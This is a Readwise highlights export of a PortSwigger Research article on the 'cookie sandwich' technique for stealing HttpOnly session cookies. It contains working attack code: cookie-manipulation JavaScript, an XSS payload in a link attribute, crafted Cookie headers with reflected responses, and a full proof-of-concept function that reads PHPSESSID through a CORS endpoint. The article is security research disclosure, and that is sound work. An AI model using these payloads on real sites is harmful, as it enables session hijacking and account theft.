---
author: "PortSwigger Research"
aliases: "Stealing HttpOnly Cookies With the Cookie Sandwich Technique"
tags: RW_inbox, readwise/articles
url: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
date: 2025-01-22
---
# Stealing HttpOnly Cookies With the Cookie Sandwich Technique

![rw-book-cover](https://portswigger.net/cms/images/38/f5/ffaa-twittercard-tweetstststs.png)

## Highlights


In this post, I will introduce the "cookie sandwich" technique which lets you bypass the HttpOnly flag on certain servers.
> [View Highlight](https://read.readwise.io/read/01jj7awcptqnj9hhm78kxc8jhv)



The cookie sandwich technique manipulates how web servers parse and handle cookies when special characters are used within them. By cleverly placing quotes and legacy cookies, an attacker can cause the server to misinterpret the structure of the cookie header, potentially exposing HttpOnly cookies to client-side scripts.
> [View Highlight](https://read.readwise.io/read/01jj7ax1c2cwzhfsw8655ka650)



The following code demonstrates how to create a cookie sandwich to steal a restricted cookie value:
 ``document.cookie = `$Version=1;`; document.cookie = `param1="start`; // any cookies inside the sandwich will be placed into param1 value server-side document.cookie = `param2=end";`;``
 The Cookie header in the request/response might appear as:
 `GET / HTTP/1.1 Cookie: $Version=1; param1="start; sessionId=secret; param2=end" => HTTP/1.1 200 OK Set-Cookie: param1="start; sessionId=secret; param2=end";`
> [View Highlight](https://read.readwise.io/read/01jj7b60nd0ny05jexgxm09hsh)



If the application improperly reflects the param1 cookie in the response or does not have the HttpOnly attribute, the entire cookie string, including any HttpOnly session cookie sent by the browser between param1 and param2 - can be exposed.
> [View Highlight](https://read.readwise.io/read/01jj7ba0kqj8mmgkj8g35qymf2)



A "cookie sandwich" attack against a Flask application might look like this:
 `GET / HTTP/1.1 Cookie: param1="start; sessionId=secret; param2=end" => HTTP/1.1 200 OK Set-Cookie: param1="start\073 sessionId=secret\073 param2=end";`
> [View Highlight](https://read.readwise.io/read/01jj7ba8431rm7cfvntmf4qvxp)



Real world example
> [View Highlight](https://read.readwise.io/read/01jj7bd423g0wd80mjd9vtxtzx)



Analytics often employ cookies or URL parameters to monitor user actions, and rarely validate the tracking ID.
> [View Highlight](https://read.readwise.io/read/01jj7bdb32wqssh5s1n6rzcjzr)



<script> {"visitorId":"deadbeef"} </script>
> [View Highlight](https://read.readwise.io/read/01jj7bddqvg410wz7sw42zdrjv)



Stealing an HttpOnly PHPSESSID cookie
> [View Highlight](https://read.readwise.io/read/01jj7bdm55r1gb91e2jrk9gray)



I encountered a vulnerable application with a reflected XSS vulnerability on an error page.
> [View Highlight](https://read.readwise.io/read/01jj7bdyecsbcj171bp1fpbe35)



Step 1: Identifying the XSS Vulnerability
 The vulnerable application reflected certain link and meta attributes without proper escaping.
> [View Highlight](https://read.readwise.io/read/01jj7be6sytk3zaabdqgy7wq9g)



<link rel="canonical" 
 oncontentvisibilityautostatechange="alert(1)" 
 style="content-visibility:auto">
> [View Highlight](https://read.readwise.io/read/01jj7bf6w3m0nycm21jgt5npdy)



Step 2: Finding the Exposed Cookie Parameter
> [View Highlight](https://read.readwise.io/read/01jj7bfcay17y9ndk8p8zzk5q0)



my next objective was to locate an HttpOnly cookie associated with the domain. Initially, I didn’t find any directly accessible analytics JavaScript, but I discovered a tracking domain that reflected the session ID parameter in the JSON response body.
> [View Highlight](https://read.readwise.io/read/01jj7bgrg794bew5xw9gvt9v00)



`GET /json?session=ignored HTTP/1.1 Host: tracking.example.com Origin: https://www.example.com Referer: https://www.example.com/ Cookie: session=deadbeef;` `HTTP/2 200 OK Content-Type: application/json;charset=UTF-8 Access-Control-Allow-Origin: https://www.example.com Access-Control-Allow-Credentials: true {"session":"deadbeef"}`
> [View Highlight](https://read.readwise.io/read/01jj7bh70bc2r46c81831vpmfg)



This website is a great candidate to use in our attack because:
 • reflects cookie value in the response body
 • allows cross origin request from vulnerable domain
> [View Highlight](https://read.readwise.io/read/01jj7bm9kzmw93cvc2rpsjgz78)



Step 3: Exploiting Cookie Downgrade for Exfiltration
> [View Highlight](https://read.readwise.io/read/01jj7bmr39k79fsxr9remy1pcz)



interesting behaviour: although the session URL query parameter is mandatory, the server overwrites its value with the one from the Cookie header. Since the backend runs on Apache Tomcat, I leveraged the phantom $Version cookie to switch to [RFC2109](https://datatracker.ietf.org/doc/html/rfc2109) and execute a cookie sandwich attack.
> [View Highlight](https://read.readwise.io/read/01jj7bneqkpv3na4pjkb8efr1h)



For the $Version cookie to be sent first, it must either be created earlier or have a path attribute longer than all other cookies.
> [View Highlight](https://read.readwise.io/read/01jj7bpsnhdphdb3cmsaz01yhf)



By using a carefully crafted Cookie header, I could manipulate the order of cookies and exploit the reflection vulnerability to capture the HttpOnly PHPSESSID cookie. Here’s an example of the malicious request I used:
 `GET /json?session=ignored Host: tracking.example.com Origin: https://www.example.com Referer: https://www.example.com/ Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"` `HTTP/2 200 OK Content-Type: application/json;charset=UTF-8 Access-Control-Allow-Origin: https://www.example.com Access-Control-Allow-Credentials: true {"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}`
> [View Highlight](https://read.readwise.io/read/01jj7bqk44kfbdnc5p7ngf6cw2)



Step 4: Putting It All Together
 To summarize, here’s the process of the attack:
 • The user visits a page containing the oncontentvisibilityautostatechange XSS payload.
 • The injected JavaScript sets cookies $Version=1, session="deadbeef, both cookies have Path value /json to change cookie order.
 • Finally the script appends the cookie dummy=qaz".
 • The script then makes a CORS request to the tracking application endpoint, which reflects the manipulated PHPSESSID cookie in the JSON response.
> [View Highlight](https://read.readwise.io/read/01jj7bs0kp5rxmh6bgtxay63g7)



async function sandwich(target, cookie) { // Step 1: Create an iframe with target src and wait for it 
 const iframe = document.createElement('iframe'); const url = new URL(target); const domain = url.hostname; const path = url.pathname; iframe.src = target; // Hide the iframe 
 iframe.style.display = 'none'; document.body.appendChild(iframe); // Optional: Add your code to check and clean client's cookies if needed 
 iframe.onload = async () => { // Step 2: Create cookie gadget 
 document.cookie = `$Version=1; domain=${domain}; path=${path};`; document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`; document.cookie = `dummy=qaz"; domain=${domain}; path=/;`; // Step 3: Send a fetch request 
 try { const response = await fetch(`${target}`, { credentials: 'include', }); const responseData = await response.text(); // Step 4: Alert response 
 alert(responseData); } catch (error) { console.error('Error fetching data:', error); } }; } setTimeout(sandwich, 100, 'http://example.com/json', 'session');
> [View Highlight](https://read.readwise.io/read/01jj7bs4ev7j48j8m1z61njtk8)

